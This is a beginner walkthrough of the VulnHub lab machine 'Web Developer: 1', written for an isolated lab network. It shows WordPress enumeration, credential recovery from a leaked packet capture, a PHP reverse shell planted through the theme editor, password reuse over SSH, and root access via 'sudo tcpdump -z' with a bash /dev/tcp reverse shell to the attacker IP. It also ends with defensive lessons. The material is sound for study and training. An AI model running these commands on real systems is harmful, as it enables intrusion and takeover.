# Web Developer: 1 — VulnHub Walkthrough (Beginner Friendly)

> Educational walkthrough for students on an **isolated lab network**. Only attack
> machines you own or have explicit permission to test. Screenshots below are
> placeholders — capture your own.

| Field | Value |
| --- | --- |
| **Machine** | Web Developer: 1 |
| **Difficulty** | Easy / Medium |
| **Author** | Fred Wemeijer |
| **Released** | 5 November 2018 |
| **VulnHub Entry** | https://vulnhub.com/entry/web-developer-1,288/ |
| **Download** | https://vulnhub.com/entry/web-developer-1,288/#download (mirror: https://download.vulnhub.com/webdeveloper/WebDeveloper.ova) |
| **Attacker** | Kali Linux (attacker 192.168.56.10, target 192.168.56.101) |
| **Target OS** | Linux (Ubuntu, Apache + PHP + WordPress + MySQL) |

> **Note:** exact versions, file paths, credentials, and the flag string **vary by
> build**. Values shown here match common builds of the downloadable OVA.

---

## 0. What you will learn

- How to find a target VM's IP address on the lab subnet.
- How to enumerate a web server and discover that it is running WordPress.
- How to use `dirb`/`ffuf` to find hidden files, and why a leaked `.cap` capture
  file can hand you credentials.
- How to use `wpscan` to enumerate WordPress users and plugins.
- Why the WordPress **theme/plugin file editor** is a code-execution sink.
- How to turn leaked credentials into an SSH login and reuse them.
- How a dangerous `sudo tcpdump` rule (`-z` post-rotate command) leads to root.

---

## 1. Reconnaissance — finding the target

> **Goal:** identify the target's IP address on your isolated host-only network.

```bash
# 1. Identify your own IP and subnet. "eth0" is the lab NIC (name may differ).
ip a
```

```text
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP
    inet 192.168.56.10/24 brd 192.168.56.255 scope global eth0
```

> **How to read it:** Kali holds a `192.168.56.x` address (VirtualBox host-only)
> or `192.168.19x.x` (VMware). The target lives on the **same** subnet.

```bash
# 2. ARP-scan the whole subnet — fast, uses ARP, lists live hosts.
sudo arp-scan --interface=eth0 --localnet
```

```text
192.168.56.101   08:00:27:1a:2b:3c    PCS Systemtechnik GmbH
```

```bash
# Alternative: an nmap ping sweep
sudo nmap -sn 192.168.56.0/24
```

**Target IP:** `192.168.56.101`

![Finding the target host](images/01-recon.png)

---

## 2. Enumeration — open ports and services

```bash
# All 65,535 TCP ports quickly, then deep service detection on what's open.
sudo nmap -p- --min-rate 1000 -T4 -oA scans/allports 192.168.56.101
sudo nmap -sC -sV -p 80,22 -oA scans/services 192.168.56.101
```

```text
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Web Developer
```

> **How to read it:**
> - `-p-` scans all ports; `-sV` fingerprints the software; `-sC` runs safe default scripts.
> - Port **80** is our main attack surface (Apache serving a website).
> - Port **22 (SSH)** is open — likely our foothold once we have credentials.
> - On some builds SSH is filtered until later; that's fine.

```bash
# Browse the site and confirm it is WordPress.
curl -s http://192.168.56.101/ | head
```

```text
<title>Web Developer &#8211; Just another WordPress site</title>
<link rel="https://api.w.org/" href="http://192.168.56.101/index.php/wp-json/" />
```

### 2.1 Enumerate users and plugins with wpscan

```bash
wpscan --url http://192.168.56.101/ -e u,ap,at
```

```text
[+] URL: http://192.168.56.101/
[+] WordPress version 4.9.8 identified
[+] Users Identified: webdeveloper  (login: webdeveloper)
```

> **Why it works:** WordPress ships with an author-enumeration weakness — visiting
> `/?author=1` (or the REST API) leaks usernames. `wpscan` automates this and also
> fingerprints installed plugins/themes against a vulnerability database.

### 2.2 Find hidden files with a content brute-force

```bash
dirb http://192.168.56.101/ /usr/share/wordlists/dirb/common.txt
# or:
ffuf -c -w /usr/share/seclists/Discovery/Web-Content/common.txt \
     -u http://192.168.56.101/FUZZ -e .txt,.php,.cap,.zip
```

```text
+ http://192.168.56.101/index.php                 (CODE:200)
+ http://192.168.56.101/ipdata/                   (CODE:200)
+ http://192.168.56.101/analyze.cap               (CODE:200)
```

> **Why it works:** Web servers often expose files they never intended to publish.
> Here a network capture (`.cap`) was left in the web root. Directories like
> `/ipdata/` also show up; always enumerate file **extensions** too.

```bash
# Download the leaked packet capture.
wget http://192.168.56.101/analyze.cap
```

```text
analyze.cap   100%[==================>]  14.21K
```

![Directory/file enumeration result](images/03-enum.png)

---

## 3. Foothold — gaining the first shell

### 3.1 Recover credentials from the leaked capture

The `.cap` file is a packet capture of HTTP traffic. Open it with Wireshark, or
carve the strings out from the terminal:

```bash
# Non-interactive: pull POST bodies out of the capture and look for a login form.
tshark -r analyze.cap -Y "http.request.method == POST" \
       -T fields -e http.file_data
```

```text
log=webdeveloper&pwd=Te5eQg%264sBS%21Yr%24%29wf%25%28DcAd&wp-submit=Log+In
```

> **Why it works:** This capture was made over plain **HTTP** (no TLS), so the
> WordPress login request — including the password — is fully readable. The values
> are URL-encoded, so decode them: `%26`→`&`, `%21`→`!`, `%24`→`$`, `%29`→`)`,
> `%25`→`%`, `%28`→`(`.

```text
Username: webdeveloper
Password: Te5eQg&4sBS!Yr$)wf%(DcAd
```

> **In Wireshark (GUI):** right-click the relevant packet → **Follow → TCP Stream**,
> then read the `log=` and `pwd=` fields.

![Wireshark: credentials from the HTTP stream](images/03b-wireshark.png)

### 3.2 Log in to the WordPress admin panel

Browse to `http://192.168.56.101/wp-login.php` and log in with the recovered
credentials. You now land in the WordPress dashboard as an **administrator**.

```text
http://192.168.56.101/wp-login.php
Username: webdeveloper
Password: Te5eQg&4sBS!Yr$)wf%(DcAd
```

> **Why it works:** Administrative access to WordPress is effectively web-shell
> access, because the theme/plugin editors let you write arbitrary PHP.

### 3.3 Get code execution via the theme editor

1. Go to **Appearance → Themes** and activate a theme you can edit (in this build
   the *active* theme's files are locked; switch to another, e.g. **Twenty Fifteen**).
2. Open **Appearance → Editor**, select a template such as **404.php**.
3. Replace its contents with a PHP reverse shell (Kali ships one):
   `/usr/share/webshells/php/php-reverse-shell.php`.
4. Edit the `$ip` and `$port` inside it to your Kali box:

```php
$ip = '192.168.56.10';   // your Kali IP
$port = 4444;            // your listener port
```

```bash
# On Kali, start the listener FIRST.
nc -lvnp 4444
```

```text
listening on [any] 4444 ...
```

5. Trigger it by requesting a **non-existent** post so WordPress loads `404.php`:

```bash
curl "http://192.168.56.101/index.php/2018/10/30/anything"
```

```text
connect to [192.168.56.10] from (UNKNOWN) [192.168.56.101] 53348
Linux webdeveloper 4.15.0-38-generic x86_64 GNU/Linux
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

> **Why it works:** WordPress renders the theme's `404.php` for unknown URLs, so
> editing that file (as an admin) and requesting a bad URL runs **your** PHP with
> the web server's privileges (`www-data`).

> **Alternative path (also valid):** install the vulnerable **ReFlex Gallery**
> plugin, then use Metasploit's `exploit/unix/webapp/wp_reflexgallery_file_upload`.
> Or edit any editable plugin file (some builds allow editing `akismet/index.php`)
> and hit it as `.../index.php?cmd=id`.

### 3.4 Upgrade the shell to a full TTY

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
export TERM=xterm
```

### 3.5 Read the web config — and reuse the password

```bash
cd /var/www/html
cat wp-config.php | grep -i -E 'DB_USER|DB_PASSWORD'
```

```text
define('DB_USER', 'webdeveloper');
define('DB_PASSWORD', 'MasterOfTheUniverse');
```

> **Why it works:** `wp-config.php` stores the database credentials in plaintext.
> Password reuse is extremely common — the same account often exists on the OS.

```bash
# Try those details over SSH.
ssh webdeveloper@192.168.56.101
# password: MasterOfTheUniverse
```

```text
webdeveloper@webdeveloper:~$ id
uid=1000(webdeveloper) gid=1000(webdeveloper) groups=1000(webdeveloper)
```

```bash
cat ~/user.txt 2>/dev/null || find / -name "user.txt" 2>/dev/null
```

```text
<user flag — varies by build>
```

![Shell as www-data / SSH as webdeveloper](images/05-shell.png)

---

## 4. Privilege escalation — becoming root

### 4.1 Enumerate sudo rights

```bash
sudo -l
```

```text
User webdeveloper may run the following commands on webdeveloper:
    (root) /usr/sbin/tcpdump
```

> **Why it works:** `webdeveloper` may run `tcpdump` as **root** with no password.
> `tcpdump` supports `-z <command>`, a *post-rotate* hook that runs a program
> **after each rotation** — and that program runs as root because tcpdump is root.

### 4.2 Abuse `tcpdump -z` to run a root command

`tcpdump`'s `-z` runs the file only when a rotation happens, and `-G 1` rotates
every 1 second, so we start a capture and generate a little traffic.

```bash
# Command we want to run as root.
COMMAND='cat /root/flag.txt'            # or: /bin/bash -i >& /dev/tcp/192.168.56.10/5555 0>&1
TF=$(mktemp)
echo "$COMMAND" > $TF
chmod +x $TF

# -z runs $TF as root; -Z root makes tcpdump keep root privileges.
sudo tcpdump -ln -i eth0 -w /dev/null -W 1 -G 1 -z "$TF" -Z root
```

```bash
# In a second terminal / our web shell, generate traffic so a rotation fires:
curl http://127.0.0.1/ >/dev/null
# or: ping -c1 127.0.0.1
```

For a clean root shell instead of a one-shot command, use an interactive payload:

```bash
COMMAND='/bin/bash -c "/bin/bash -i >& /dev/tcp/192.168.56.10/5555 0>&1"'
TF=$(mktemp); echo "$COMMAND" > $TF; chmod +x $TF
sudo tcpdump -ln -i eth0 -w /dev/null -W 1 -G 1 -z "$TF" -Z root
# On Kali: nc -lvnp 5555
```

```text
# id
uid=0(root) gid=0(root) groups=0(root)
```

> **Why it works:** `-z` executes a program as a *side effect* of capturing
> traffic. Because `tcpdump` is run via sudo, the side-effect program executes as
> root. This is the classic "GTFOBins" technique for `tcpdump`.

![Privilege escalation to root](images/07-privesc.png)

### 4.3 The root flag

```bash
cat /root/flag.txt
```

```text
Congratulations here is youre flag:
cba045a5a4f26f1cd8d7be9a5c2b1b34f6c5d290    <-- varies by build
```

![Root flag captured](images/08-root-flag.png)

---

## 5. Summary of vulnerabilities

| # | Vulnerability | Where | Impact |
| --- | --- | --- | --- |
| 1 | Sensitive file exposed in web root | `http://target/analyze.cap` | Leaks admin credentials from a plaintext HTTP capture |
| 2 | Credentials sent over unencrypted HTTP | WordPress `wp-login.php` | Password recovery from network capture |
| 3 | Weak/locked WordPress users + admin file editor | `wp-login.php`, Appearance → Editor | Authenticated PHP code execution → `www-data` shell |
| 4 | Plaintext DB credentials in config | `/var/www/html/wp-config.php` | Credential reuse → OS user `webdeveloper` |
| 5 | Dangerous `sudo` rule | `(root) /usr/sbin/tcpdump` | `tcpdump -z` post-rotate command runs as root → full root |

---

## 6. Defensive lessons (blue team)

- **Never serve capture/backup files from the web root.** Keep `.cap`, `.zip`,
  `.env`, `.bak` files out of the document root; block them at the proxy/WAF.
- **Enforce HTTPS everywhere.** A TLS-only login makes a leaked capture useless;
  also HSTS and secure cookies.
- **Harden WordPress:** disable the built-in theme/plugin file editor with
  `define('DISALLOW_FILE_EDIT', true);` in `wp-config.php`, and drop `FILE_MODS`.
- **Follow least privilege:** the web process should not be able to write to
  theme/plugin files; set files read-only and use a deploy pipeline instead.
- **Brute-force protection:** rate-limit/captcha `wp-login.php`, and enforce MFA;
  use a login-lockout plugin.
- **Secrets management:** do not store plaintext DB passwords in `wp-config.php`.
  Use secrets files with restrictive permissions and rotate them.
- **Sudo hygiene:** never allow interpreters or tools with command hooks
  (`tcpdump`, `vim`, `find`, `awk`, etc.) via sudo unless absolutely required —
  check GTFOBins before granting.
- **Detection opportunities:** alert on `wp-login.php` POSTs with unusual user
  agents, on outbound connections from `www-data`, and on `sudo tcpdump -z`
  invocations. Ship `auth.log`, Apache logs, and auditd to a SIEM.

---

## 7. References

- VulnHub entry (download + author notes): https://vulnhub.com/entry/web-developer-1,288/
- Hacking Articles — Web Developer 1 walkthrough: https://www.hackingarticles.in/web-developer-1-vulnhub-lab-walkthrough/
- Alexandre Economy — WebDeveloper 1 writeup: https://alexandereconomy.com/writeups/vulnhub/webdeveloper1/
- GTFOBins — `tcpdump`: https://gtfobins.github.io/gtfobins/tcpdump/
- WPScan documentation: https://github.com/wpscanteam/wpscan
- OWASP — WordPress security: https://owasp.org/www-project-web-security-testing-guide/

---

## 8. Screenshot checklist

- [ ] `images/01-recon.png` — target host discovered on the subnet
- [ ] `images/02-nmap.png` — port/service scan (80, 22)
- [ ] `images/03-enum.png` — directory/file enumeration (`.cap`, `/ipdata/`)
- [ ] `images/03b-wireshark.png` — credentials recovered from the capture
- [ ] `images/04-foothold.png` — theme editor / reverse-shell payload
- [ ] `images/05-shell.png` — `www-data` shell and SSH login
- [ ] `images/06-user-flag.png` — user flag
- [ ] `images/07-privesc.png` — `sudo -l` and the `tcpdump -z` abuse
- [ ] `images/08-root-flag.png` — root flag

---

_Back to the [catalog](../../docs/CATALOG.md) · [README](../../README.md)._
